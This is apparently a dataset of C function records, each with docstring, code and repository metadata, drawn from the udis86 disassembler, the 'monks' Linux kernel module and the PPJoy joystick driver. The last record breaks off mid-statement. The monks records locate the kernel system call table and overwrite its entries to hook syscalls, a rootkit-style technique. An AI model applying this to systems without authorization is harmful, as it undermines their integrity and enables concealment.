{"docstring": "/* =============================================================================\n * ud_opr_is_sreg\n *    Returns non-zero if the given operand is of a general purpose\n *    register type.\n * =============================================================================\n */\n", "func_signal": "int\nud_opr_is_gpr(const struct ud_operand *opr)", "code": "{\n  return opr->type == UD_OP_REG && \n         opr->base >= UD_R_AL   &&\n         opr->base <= UD_R_R15;\n}", "path": "udis86\\libudis86\\udis86.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/* =============================================================================\n * ud_disassemble\n *    Disassembles one instruction and returns the number of \n *    bytes disassembled. A zero means end of disassembly.\n * =============================================================================\n */\n", "func_signal": "extern unsigned int\nud_disassemble(struct ud* u)", "code": "{\n  int len;\n  if (u->inp_end) {\n    return 0;\n  }\n  if ((len = ud_decode(u)) > 0) {\n    if (u->translator != NULL) {\n      u->asm_buf[0] = '\\0';\n      u->translator(u);\n    }\n  }\n  return len;\n}", "path": "udis86\\libudis86\\udis86.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/* =============================================================================\n * ud_insn_hex() - Returns hex form of disassembled instruction.\n * =============================================================================\n */\n", "func_signal": "const char* \nud_insn_hex(struct ud* u)", "code": "{\n  u->insn_hexcode[0] = 0;\n  if (!u->error) {\n    unsigned int i;\n    const unsigned char *src_ptr = ud_insn_ptr(u);\n    char* src_hex;\n    src_hex = (char*) u->insn_hexcode;\n    /* for each byte used to decode instruction */\n    for (i = 0; i < ud_insn_len(u) && i < sizeof(u->insn_hexcode) / 2;\n         ++i, ++src_ptr) {\n      sprintf(src_hex, \"%02x\", *src_ptr & 0xFF);\n      src_hex += 2;\n    }\n  }\n  return u->insn_hexcode;\n}", "path": "udis86\\libudis86\\udis86.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/* =============================================================================\n * ud_insn_get_opr\n *    Return the operand struct representing the nth operand of\n *    the currently disassembled instruction. Returns NULL if\n *    there's no such operand.\n * =============================================================================\n */\n", "func_signal": "const struct ud_operand*\nud_insn_opr(const struct ud *u, unsigned int n)", "code": "{\n  if (n > 3 || u->operand[n].type == UD_NONE) {\n    return NULL; \n  } else {\n    return &u->operand[n];\n  }\n}", "path": "udis86\\libudis86\\udis86.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/* =============================================================================\n * ud_inp_set_hook\n *    Sets input hook.\n * =============================================================================\n */\n", "func_signal": "void \nud_set_input_hook(register struct ud* u, int (*hook)(struct ud*))", "code": "{\n  ud_inp_init(u);\n  u->inp_hook = hook;\n}", "path": "udis86\\libudis86\\udis86.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/*****************************************************************************\\\n| This is where the magic happens. We iterate over the .syscalls ELF section  |\n| and get the information that was stored there by __REGISTER_SYSCALL/32.     |\n| Once we have that information, we hook all the available syscalls           |\n\\*****************************************************************************/\n", "func_signal": "static int do_hook_calls(void *arg)", "code": "{\n\textern void *stub;\n#ifdef CONFIG_IA32_EMULATION\n\textern void *stub_32;\n#endif\t\n\tsyscall_info_t *iter;\n\n\tfor_each_syscall(iter){\n\n\t\tadd_syscalls_state_table_entry(iter->name, &iter->state);\n\t\tmonks_info(\"Hook %s\\n\", iter->name);\n\n\t\tif(iter->is32){\n#ifdef CONFIG_IA32_EMULATION\n\t\t\titer->rf = (void *)ia32_sct_map[iter->__NR_];\n\t\t\tia32_sct_map[iter->__NR_] = create_stub(iter, &stub_32);\n#endif\n\t\t}else{\n\t\t\titer->rf = (void *)sct_map[iter->__NR_];\n\t\t\tsct_map[iter->__NR_] = create_stub(iter, &stub);\n\t\t}\n\t}\n\n\treturn 0;\n}", "path": "monks_kmodule\\sct_hook.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/* =============================================================================\n * ud_input_skip\n *    Skip n input bytes.\n * ============================================================================\n */\n", "func_signal": "void \nud_input_skip(struct ud* u, size_t n)", "code": "{\n  if (u->inp_end) {\n    return;\n  }\n  if (u->inp_buf == NULL) {\n    while (n--) {\n      int c = u->inp_hook(u);\n      if (c == UD_EOI) {\n        goto eoi;\n      }\n    }\n    return;\n  } else {\n    if (n > u->inp_buf_size ||\n        u->inp_buf_index > u->inp_buf_size - n) {\n      u->inp_buf_index = u->inp_buf_size; \n      goto eoi;\n    }\n    u->inp_buf_index += n; \n    return;\n  }\neoi:\n  u->inp_end = 1;\n  UDERR(u, \"cannot skip, eoi received\\b\");\n  return;\n}", "path": "udis86\\libudis86\\udis86.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/*****************************************************************************\\\n| Method to get the system call table                                         |\n\\*****************************************************************************/\n", "func_signal": "static int get_sct(void)", "code": "{\n\tsys_call_table = get_sys_call_table();\n\tif(!sys_call_table){\n\t\tmonks_info(\"syscall_table is NULL, quitting...\\n\");\n\t\treturn 0;\n\t}else{\n\t\tmonks_info(\"Found syscall_table addr at 0x%p\\n\", sys_call_table);\n\t}\n\n#ifdef CONFIG_IA32_EMULATION\n\tia32_sys_call_table = get_ia32_sys_call_table();\n\tif(!ia32_sys_call_table){\n\t\tmonks_info(\"syscall_table is NULL, quitting...\\n\");\n\t\treturn 0;\n\t}else{\n\t\tmonks_info(\"Found ia32_syscall_table addr at 0x%p\\n\", ia32_sys_call_table);\n\t}\n#endif\n\n\treturn 1;\n}", "path": "monks_kmodule\\sct_hook.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/* =============================================================================\n * ud_set_mode() - Set Disassemly Mode.\n * =============================================================================\n */\n", "func_signal": "extern void \nud_set_mode(struct ud* u, uint8_t m)", "code": "{\n  switch(m) {\n  case 16:\n  case 32:\n  case 64: u->dis_mode = m ; return;\n  default: u->dis_mode = 16; return;\n  }\n}", "path": "udis86\\libudis86\\udis86.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/* =============================================================================\n * ud_insn_ptr\n *    Returns a pointer to buffer containing the bytes that were\n *    disassembled.\n * =============================================================================\n */\n", "func_signal": "extern const uint8_t* \nud_insn_ptr(const struct ud* u)", "code": "{\n  return (u->inp_buf == NULL) ? \n            u->inp_sess : u->inp_buf + (u->inp_buf_index - u->inp_ctr);\n}", "path": "udis86\\libudis86\\udis86.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/*0 == ok, 1 == ko*/\n", "func_signal": "int stop()", "code": "{\n\tint ret = 0;\n\tFILE *fp = fopen(\"/proc/sys/monks/state\", \"w\");\n\n\tif(fp == NULL){\n\t\tret = 1;\n\t\tprintf(\"Error: Can't start hijacking sys calls.\\n\");\n\t}else{\n\t\tfprintf(fp, \"%c\", '0');\n\t\tfclose(fp);\n\t\tret = 0;\n\t}\n\n\treturn ret;\n}", "path": "monks\\lkm.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/* =============================================================================\n * ud_set_vendor() - Set vendor.\n * =============================================================================\n */\n", "func_signal": "extern void \nud_set_vendor(struct ud* u, unsigned v)", "code": "{\n  switch(v) {\n  case UD_VENDOR_INTEL:\n    u->vendor = v;\n    break;\n  case UD_VENDOR_ANY:\n    u->vendor = v;\n    break;\n  default:\n    u->vendor = UD_VENDOR_AMD;\n  }\n}", "path": "udis86\\libudis86\\udis86.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/*****************************************************************************\\\n| This is where we restore the REAL functions, aka, undo what HOOK and        |\n| HOOK_IA32 did.                                                              |\n\\*****************************************************************************/\n", "func_signal": "static int do_unhook_calls(void *arg)", "code": "{\n\tsyscall_info_t *iter;\n\n\tfor_each_syscall(iter){\n\n\t\tmonks_info(\"Unhook %s\\n\", iter->name);\n\t\t\n\t\tif(iter->is32){\n#ifdef CONFIG_IA32_EMULATION\n\t\t\tia32_sct_map[iter->__NR_] = destroy_stub(iter, ia32_sct_map[iter->__NR_]);\n#endif\n\t\t}else{\n\t\t\tsct_map[iter->__NR_] = destroy_stub(iter, sct_map[iter->__NR_]);\n\t\t}\n\t}\n\n\treturn 0;\n}", "path": "monks_kmodule\\sct_hook.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/* =============================================================================\n * ud_init\n *    Initializes ud_t object.\n * =============================================================================\n */\n", "func_signal": "extern void \nud_init(struct ud* u)", "code": "{\n  memset((void*)u, 0, sizeof(struct ud));\n  ud_set_mode(u, 16);\n  u->mnemonic = UD_Iinvalid;\n  ud_set_pc(u, 0);\n#ifndef __UD_STANDALONE__\n  ud_set_input_file(u, stdin);\n#endif /* __UD_STANDALONE__ */\n\n  ud_set_asm_buffer(u, u->asm_buf_int, sizeof(u->asm_buf_int));\n}", "path": "udis86\\libudis86\\udis86.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/*****************************************************************************\\\n| Destroy a stub will actually change the stub's opcode so it will call only  |\n| the real syscall.                                                           |\n| That means that the content of the stub will look like the following:       |\n|                                                                             |\n| 1. Save syscall arguments                                                   |\n| 2. Call the real syscall                                                    |\n| 3. Save the returned value                                                  |\n| 4. Return the result from the call to the real syscall                      |\n\\*****************************************************************************/\n", "func_signal": "static void *destroy_stub(syscall_info_t *iter, void *stub)", "code": "{\n\tud_patch_cmp(stub);\n\n\treturn stub; //iter->rf;\n}", "path": "monks_kmodule\\sct_hook.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/* =============================================================================\n * ud_inp_set_buffer\n *    Set buffer as input.\n * =============================================================================\n */\n", "func_signal": "void \nud_set_input_buffer(register struct ud* u, const uint8_t* buf, size_t len)", "code": "{\n  ud_inp_init(u);\n  u->inp_buf = buf;\n  u->inp_buf_size = len;\n  u->inp_buf_index = 0;\n}", "path": "udis86\\libudis86\\udis86.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/* =============================================================================\n * ud_set_asm_buffer\n *    Allow the user to set an assembler output buffer. If `buf` is NULL,\n *    we switch back to the internal buffer.\n * =============================================================================\n */\n", "func_signal": "void\nud_set_asm_buffer(struct ud *u, char *buf, size_t size)", "code": "{\n  if (buf == NULL) {\n    ud_set_asm_buffer(u, u->asm_buf_int, sizeof(u->asm_buf_int));\n  } else {\n    u->asm_buf = buf;\n    u->asm_buf_size = size;\n  }\n}", "path": "udis86\\libudis86\\udis86.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/* =============================================================================\n * ud_opr_is_sreg\n *    Returns non-zero if the given operand is of a segment register type.\n * =============================================================================\n */\n", "func_signal": "int\nud_opr_is_sreg(const struct ud_operand *opr)", "code": "{\n  return opr->type == UD_OP_REG && \n         opr->base >= UD_R_ES   &&\n         opr->base <= UD_R_GS;\n}", "path": "udis86\\libudis86\\udis86.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/* =============================================================================\n * ud_lookup_mnemonic\n *    Looks up mnemonic code in the mnemonic string table.\n *    Returns NULL if the mnemonic code is invalid.\n * =============================================================================\n */\n", "func_signal": "const char*\nud_lookup_mnemonic(enum ud_mnemonic_code c)", "code": "{\n  if (c < UD_MAX_MNEMONIC_CODE) {\n    return ud_mnemonics_str[c];\n  } else {\n    return NULL;\n  }\n}", "path": "udis86\\libudis86\\udis86.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/* \n * ud_inp_init\n *    Initializes the input system.\n */\n", "func_signal": "static void\nud_inp_init(struct ud *u)", "code": "{\n  u->inp_hook      = NULL;\n  u->inp_buf       = NULL;\n  u->inp_buf_size  = 0;\n  u->inp_buf_index = 0;\n  u->inp_curr      = 0;\n  u->inp_ctr       = 0;\n  u->inp_end       = 0;\n  u->inp_peek      = UD_EOI;\n  UD_NON_STANDALONE(u->inp_file = NULL);\n}", "path": "udis86\\libudis86\\udis86.c", "repo_name": "alexandernst/monks", "stars": 67, "license": "None", "language": "c", "size": 4059}
{"docstring": "/**************************************************************************/\n/* Read all configured joysticks from the registry and add PDOs for them  */\n/**************************************************************************/\n", "func_signal": "VOID PPJoyBus_CreateFromRegistry (IN PDEVICE_OBJECT DeviceObject)", "code": "{\n NTSTATUS\t\t\t\t\tntStatus;\n RTL_QUERY_REGISTRY_TABLE\tQueryTable[2];\n \n PAGED_CODE ();\n\n PPJOY_DBGPRINT (FILE_PPJOYBUS|PPJOY_FENTRY, (\"PPJoyBus_CreateFromRegistry(DeviceObject=0x%p)\",DeviceObject) );\n\n /* Create table to query registry. 2nd entry is NULL to teminate the list */\n RtlZeroMemory (QueryTable,sizeof(QueryTable));\n QueryTable->Flags= RTL_QUERY_REGISTRY_REQUIRED;\n QueryTable->QueryRoutine= PPJoyBus_RegQueryFunc;\n\n /* Then execute query. Callback function does all the work. */\n ntStatus= RtlQueryRegistryValues (RTL_REGISTRY_ABSOLUTE,Globals.ParamRegistryPath.Buffer,QueryTable,(PVOID)DeviceObject,NULL);\n\n PPJOY_EXITPROC (FILE_PPJOYBUS|PPJOY_FEXIT_STATUSOK, \"PPJoyBus_CreateFromRegistry:\",ntStatus );\n return;\n}", "path": "PPJoyBus\\PPJoyBus.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "/**************************************************************************/\n/* Routine to route Plug and Play requests for the Bus FDO and the        */\n/* Joystick PDO.                                                          */\n/**************************************************************************/\n", "func_signal": "NTSTATUS PPJoyBus_PnP (IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)", "code": "{\n NTSTATUS\t\tntStatus;\n PCOMMON_DATA\tCommonData;\n int\t\t\tMustLeaveRequest;\n\n PAGED_CODE ();\n\n PPJOY_DBGPRINT (FILE_PPJOYBUS|PPJOY_FENTRY, (\"PPJoyBus_Pnp(DeviceObject=0x%p,Irp=0x%p)\",DeviceObject,Irp) );\n\n MustLeaveRequest= IoGetCurrentIrpStackLocation(Irp)->MinorFunction!=IRP_MN_REMOVE_DEVICE;\n CommonData= DeviceObject->DeviceExtension;\n\n ntStatus= PPJoyBus_EnterRequest(CommonData);\n if (!NT_SUCCESS(ntStatus))\n {\n  /* Set status in IRP and complete the request */\n  MustLeaveRequest= 1;\n  Irp->IoStatus.Status= ntStatus;\n  IoCompleteRequest (Irp,IO_NO_INCREMENT);\n  goto Exit;\n }\n\n if (CommonData->Flags&PPJFLAGS_ISBUSDEV)\n  ntStatus= PPJoyBus_PnP_Bus (DeviceObject,Irp);\n else\n  ntStatus= PPJoyBus_PnP_Joy (DeviceObject,Irp);\n\n\nExit:\n /* Call leave request if the flag was set (only set for REMOVE_DEVICE  */\n /* (because it called from the Remove request routine.)                */\n if (MustLeaveRequest)\n  PPJoyBus_LeaveRequest(CommonData);\n PPJOY_EXITPROC (FILE_PPJOYBUS|PPJOY_FEXIT_STATUSOK, \"PPJoyBus_PnP\",ntStatus);\n return ntStatus;\n}", "path": "PPJoyBus\\PPJoyBus.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "/* Entry and exit: Sel, Clock high */\n", "func_signal": "void PSX_Do_Packet_IO (PUCHAR WritePort, UCHAR BaseValue, UCHAR SelHigh, UCHAR SelLow, UCHAR ClockHigh, UCHAR ClockLow, UCHAR CmdHigh, UCHAR CmdLow,\n\t\t\t\t\t   PUCHAR ReadPort, UCHAR ReadBitMask, UCHAR ReadInvMask, PUCHAR AckPort, UCHAR AckBitMask, UCHAR AckInvMask,\n\t\t\t\t\t   UCHAR *ReadBuffer, UCHAR ReadLen, UCHAR *WriteBuffer, UCHAR WriteLen, PTIMING_PSX Timing)", "code": "{\n UCHAR\tReadValue;\n UCHAR\tWriteValue;\n UCHAR\tLength;\n UCHAR\tCount;\n ULONG\tBitDelay=\tTiming->BitDelay;\n ULONG\tAckXDelay=\tTiming->AckXDelay;\n\n WRITE_PORT_UCHAR (WritePort,(UCHAR)(BaseValue|SelLow|ClockHigh));\n KeStallExecutionProcessor (Timing->SelDelay);\n\n /* Perform first three bytes of IO */\n WriteValue= (WriteLen>0)?WriteBuffer[0]:0x01;\t/* Default to tap1 start transfer */\n PSX_Do_Byte_IO(WriteValue,WritePort,(UCHAR)(BaseValue|SelLow),ClockHigh,ClockLow,CmdHigh,CmdLow,ReadPort,ReadBitMask,ReadInvMask,BitDelay);\n PSX_Wait_For_ACK(AckPort,AckBitMask,AckInvMask,Timing->Ack1Delay);\n\n WriteValue= (WriteLen>1)?WriteBuffer[1]:0x42;\n ReadValue= PSX_Do_Byte_IO(WriteValue,WritePort,(UCHAR)(BaseValue|SelLow),ClockHigh,ClockLow,CmdHigh,CmdLow,ReadPort,ReadBitMask,ReadInvMask,BitDelay);\n PSX_Wait_For_ACK(AckPort,AckBitMask,AckInvMask,AckXDelay);\n if (ReadLen>0) ReadBuffer[0]= ReadValue;\n Length= (ReadValue&0x0F)*2 + 3;\n\n WriteValue= (WriteLen>2)?WriteBuffer[2]:0x00;\n ReadValue= PSX_Do_Byte_IO(WriteValue,WritePort,(UCHAR)(BaseValue|SelLow),ClockHigh,ClockLow,CmdHigh,CmdLow,ReadPort,ReadBitMask,ReadInvMask,BitDelay);\n if (ReadLen>1) ReadBuffer[1]= ReadValue;\n\n if (WriteLen>Length) Length= WriteLen;\n for (Count=3;Count<Length;Count++)\n {\n  PSX_Wait_For_ACK(AckPort,AckBitMask,AckInvMask,AckXDelay);\n\n  WriteValue= (WriteLen>Count)?WriteBuffer[Count]:0x00;\n  ReadValue= PSX_Do_Byte_IO(WriteValue,WritePort,(UCHAR)(BaseValue|SelLow),ClockHigh,ClockLow,CmdHigh,CmdLow,ReadPort,ReadBitMask,ReadInvMask,BitDelay);\n  if (ReadLen>=Count) ReadBuffer[Count-1]= ReadValue;\n }\n KeStallExecutionProcessor (Timing->TailDelay);\n WRITE_PORT_UCHAR (WritePort,(UCHAR)(BaseValue|SelHigh|ClockHigh));\n\n if (ReadBuffer[1]!=0x5A)\n {\n  if (PPJoy_RuntimeDebug&RTDEBUG_PSXERR)\n   ToggleSpeaker();\n\n#ifdef TRAP\n  DbgPrint (\"INVALID PACKET RECEIVED:\\n\");\n\n  DbgPrint (\"Write buffer contents: \");\n  for (Count=0; Count<WriteLen; Count++)\n   DbgPrint (\"%02X \",WriteBuffer[Count]);\n  DbgPrint (\"\\n\");\n\n  DbgPrint (\"Read buffer contents: \");\n  for (Count=0; Count<Length-1; Count++)\n   DbgPrint (\"%02X \",ReadBuffer[Count]);\n  DbgPrint (\"\\n\");\n#endif\n }\n}", "path": "PPortJoy\\Joystick.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "static void CALLBACK waveInProc(HWAVEIN hwi, UINT uMsg, void *lpUser, WAVEHDR *buf, DWORD Reserved)", "code": "{\n    int i;\n    if (uMsg == WIM_DATA) {\n        int Size = waveFmt.nBlockAlign;\n        int Length = buf->dwBytesRecorded / Size;\n        if (Size == 1) {\n            for (i = 0; i < Length; i++) {\n                ProcessData((unsigned char)buf->lpData[i]);\n            }\n        } else if (Size == 2) {\n            for (i = 0; i < Length; i++) {\n                ProcessData(((signed short*)(buf->lpData))[i]);\n            }\n        }\n        if (waveRecording) waveInAddBuffer(waveIn, waveBuf[buf->dwUser], sizeof(WAVEHDR));\n    }\n}", "path": "RCCallbackDLLs\\main.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "// Get directory from where file was loaded\n", "func_signal": "char *GetMyDirectory (char *MyModuleName, char *Buffer, int BufSize)", "code": "{\n HMODULE\t\t\t\thModule;\n char\t\t\t\t\t*TempPtr;\n GetModuleFileNameA_PTR\tGetModuleFileNameA_Ptr;\n\n *Buffer= 0;\n GetModuleFileNameA_Ptr= (GetModuleFileNameA_PTR) GetProcAddress(GetModuleHandle(TEXT(\"kernel32\")),\"GetModuleFileNameA\");\n if(!GetModuleFileNameA_Ptr)\n {\n  DebugPrintf ((\"GetModuleFileNameA entry point not found %d\\n\",GetLastError()))\n  return Buffer;\n }\n\n hModule= GetModuleHandle(MyModuleName);\n if (!hModule)\n {\n  DebugPrintf ((\"GetModuleHandle() error %d trying to get handle for '%s'\\n\",GetLastError(),MyModuleName))\n  return Buffer;\n }\n\n if (!GetModuleFileNameA_Ptr(hModule,Buffer,BufSize))\n {\n  DebugPrintf ((\"GetModuleFileNameA_Ptr error %d\\n\",GetLastError()))\n }\n \n TempPtr= strrchr(Buffer,'\\\\');\t\t\t// Get last backslash in the path name\n if (*TempPtr) *(TempPtr+1)= 0;\t\t\t// And terminate string just after it\n\n DebugPrintf ((\"Directory for AddJoyDrivers.dll is  %s\\n\",Buffer))\n return Buffer;\n}", "path": "AddJoyDrivers\\UtilFunc.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "/**************************************************************************/\n/* Interface read routines                                                */\n/**************************************************************************/\n", "func_signal": "void ReadIanHarries (IN PDEVICE_EXTENSION DeviceExtension)", "code": "{\n UCHAR\t\tData;\n PRAWINPUT\tRawInput=\t&(DeviceExtension->RawInput);\n PUCHAR\t\tBasePort=\t(PUCHAR)(ULONG_PTR) DeviceExtension->Config.PortAddress;\n UCHAR\t\tUnitNumber=\tDeviceExtension->Config.UnitNumber;\n\n /* Exit if invalid UnitNumber, leave RawInput unchanged */\n if (UnitNumber>0)\n  return;\n\n /* Read the data we need from the status port */\n Data= READ_PORT_UCHAR (STATUSPORT(BasePort));\n PPJOY_DBGPRINT (FILE_JOYSTICK | PPJOY_BABBLE2, (\"IANHARRIES: Read parallel port 0x%p status =0x%x\",BasePort,Data) );\n\n BUTTON1(RawInput,IANHARRIES_FIRE1(Data))\n\n AXISLR (RawInput,IANHARRIES_LEFT(Data),IANHARRIES_RIGHT(Data))\n AXISUD (RawInput,IANHARRIES_UP(Data),IANHARRIES_DOWN(Data))\n}", "path": "PPortJoy\\Joystick.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "/**************************************************************************/\n/* Routine to break string into Joystick parameters. We expect the string */\n/* to be in the format pXXtXXuXX where XX is a hex value. Anything else   */\n/* is an error.                                                           */\n/**************************************************************************/\n", "func_signal": "ULONG PPJoyBus_CrackParamString (IN PWSTR ParamString, UCHAR *LPTNumber, UCHAR *JoyType, UCHAR *UnitNumber)", "code": "{\n UCHAR\tDigit1;\n UCHAR\tDigit2;\n\n PAGED_CODE ();\n\n if (*(ParamString++)!=L'p')\n  return 0;\n\n if (!PPJoyBus_GetHexDigit(*(ParamString++),&Digit1))\n  return 0;\n if (!PPJoyBus_GetHexDigit(*(ParamString++),&Digit2))\n  return 0;\n\n *LPTNumber= Digit1<<4|Digit2;\n\n\n if (*(ParamString++)!=L't')\n  return 0;\n\n if (!PPJoyBus_GetHexDigit(*(ParamString++),&Digit1))\n  return 0;\n if (!PPJoyBus_GetHexDigit(*(ParamString++),&Digit2))\n  return 0;\n\n *JoyType= Digit1<<4|Digit2;\n\n\n if (*(ParamString++)!=L'u')\n  return 0;\n\n if (!PPJoyBus_GetHexDigit(*(ParamString++),&Digit1))\n  return 0;\n if (!PPJoyBus_GetHexDigit(*(ParamString++),&Digit2))\n  return 0;\n\n *UnitNumber= (Digit1<<4|Digit2) - 1;\n\n return 1;\n}", "path": "PPJoyBus\\PPJoyBus.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "/**************************************************************************/\n/* Routine to handle requests to open and close the bus FDO or the        */\n/* joystick PDO.                                                          */\n/**************************************************************************/\n", "func_signal": "NTSTATUS PPJoyBus_CreateClose (IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)", "code": "{\n PIO_STACK_LOCATION\tIrpStack;\n NTSTATUS\t\t\tntStatus;\n int\t\t\t\tIsBusDevice;\n PCOMMON_DATA\t\tCommonData;\n\n PAGED_CODE ();\n\n PPJOY_DBGPRINT (FILE_PPJOYBUS|PPJOY_FENTRY, (\"PPJoyBus_CreateClose(DeviceObject=0x%p,Irp=0x%p)\",DeviceObject,Irp) );\n\n /* Get a pointer to common device data */\n CommonData= (PCOMMON_DATA) DeviceObject->DeviceExtension;\n\n ntStatus= PPJoyBus_EnterRequest(CommonData);\n if (!NT_SUCCESS(ntStatus))\n  goto ExitAndComplete;\n\n /* Return device busy status if our DeviceObject has not been started */\n if (!(CommonData->Flags&PPJFLAGS_STARTED))\n {\n  ntStatus= STATUS_DEVICE_NOT_READY;\n  goto ExitAndComplete;\n }\n\n IsBusDevice= CommonData->Flags&PPJFLAGS_ISBUSDEV;\n IrpStack = IoGetCurrentIrpStackLocation(Irp);\n ntStatus= STATUS_SUCCESS;\n\n switch(IrpStack->MajorFunction)\n {\n  case IRP_MJ_CREATE:\n\t\tPPJOY_DBGPRINT (FILE_PPJOYBUS|PPJOY_BABBLE, (\"PPJoyBus_CreateClose: IRP_MJ_CREATE for %s\",IsBusDevice?\"Bus\":\"Joystick\") );\n\t\tIrp->IoStatus.Information = 0;\n\t\tbreak;\n\n  case IRP_MJ_CLOSE:\n\t\tPPJOY_DBGPRINT (FILE_PPJOYBUS|PPJOY_BABBLE, (\"PPJoyBus_CreateClose: IRP_MJ_CLOSE for %s\",IsBusDevice?\"Bus\":\"Joystick\") );\n\t\tIrp->IoStatus.Information = 0;\n\t\tbreak;\n\n  default:\n\t\tPPJOY_DBGPRINT (FILE_PPJOYBUS|PPJOY_WARN, (\"PPJoyBus_CreateClose: Not handled IrpStack->MajorFunction 0x%x for %s\",IrpStack->MajorFunction,IsBusDevice?\"Bus\":\"Joystick\") );\n\t\tntStatus = STATUS_INVALID_PARAMETER;\n\t    break;\n }\n\n /* Save status and complete IRP for Joystick, pass to PDO on for bus */\n if (IsBusDevice)\n {\n  ntStatus= PPJoyBus_SendIrpSynchronously (((PBUS_DEVICE_DATA)CommonData)->NextLowerDriver,Irp);\n  if (ntStatus==STATUS_NOT_IMPLEMENTED||ntStatus==STATUS_INVALID_DEVICE_REQUEST)\n   ntStatus= STATUS_SUCCESS;\n }\n\nExitAndComplete:\n PPJoyBus_LeaveRequest(CommonData);\n /* Set status in IRP and complete the request */\n Irp->IoStatus.Status= ntStatus;\n IoCompleteRequest (Irp,IO_NO_INCREMENT);\n\n PPJOY_EXITPROC (FILE_PPJOYBUS|PPJOY_FEXIT_STATUSOK, \"PPJoyBus_CreateClose\", ntStatus);\n return ntStatus;\n}", "path": "PPJoyBus\\PPJoyBus.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "/**************************************************************************/\n/* Routine to read joystick data for this device object. Before read,     */\n/* aquire spinlock to ensure exclusive access, after read release the     */\n/* spinlock again.                                                        */\n/**************************************************************************/\n", "func_signal": "NTSTATUS PPJoy_UpdateJoystickData (IN PDEVICE_EXTENSION DeviceExtension)", "code": "{\n// PUCHAR\t\tPort;\n UCHAR\t\tData;\n KIRQL\t\tOldIrql;\n\n PPJOY_DBGPRINT (FILE_JOYSTICK|PPJOY_FENTRY, (\"PPJoy_UpdateJoystickData (DeviceExt=0x%p)\",DeviceExtension) );\n\n /* Acquire the global spinlock. We are now at dispatch level.        */\n /* This is to ensure no one touches the port while we are reading it */\n /* We currently do this at a global level. An optimisation would be  */\n /* to lock on a per-port basis. But too much effort for now.         */\n KeAcquireSpinLock (&Globals.SpinLock,&OldIrql);\n\n if ((DeviceExtension->Config.JoyType<=PPJOY_MAX_JOYTYPE)&&(JoyDefs[DeviceExtension->Config.JoyType].ReadFunc))\n {\n  JoyDefs[DeviceExtension->Config.JoyType].ReadFunc(DeviceExtension);\n }\n else\n {\n  PPJOY_DBGPRINT (FILE_JOYSTICK | PPJOY_ERROR, (\"No such joystick type: %d\",DeviceExtension->Config.JoyType) );\n }\n\n /* After this we are back at the old Irql level */\n KeReleaseSpinLock (&Globals.SpinLock,OldIrql);\n\n PPJOY_DBGPRINT (FILE_IOCTL|PPJOY_FEXIT, (\"PPJoy_UpdateJoystickData\") );\n\n return STATUS_SUCCESS;\n}", "path": "PPortJoy\\Joystick.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "/**************************************************************************/\n/* Main entry point for this driver. Setup entry points to other driver   */\n/* routines. Do driver-wide initialisation.                               */\n/**************************************************************************/\n", "func_signal": "NTSTATUS DriverEntry (IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)", "code": "{\n NTSTATUS\tntStatus;\n \n ntStatus= STATUS_SUCCESS;\n PPJoyBus_DebugLevel= PPJOY_DEFAULT_DEBUGLEVEL;\n\n PPJOY_DBGPRINT (FILE_PPJOYBUS|PPJOY_WARN, (\"Built \" __DATE__ \" at \" __TIME__) );\n PPJOY_DBGPRINT (FILE_PPJOYBUS|PPJOY_FENTRY, (\"DriverEntry (DriverObject=0x%p,RegistryPath=0x%p)\",DriverObject, RegistryPath) );\n\n RtlZeroMemory (&Globals,sizeof(Globals));\n\n /* Setup copy of DriverObject first so we can use it for event log function */\n Globals.DriverObject= DriverObject;\n\n /* Allocate buffer to store registry path to the parameters registry key */\n Globals.ParamRegistryPath.MaximumLength= 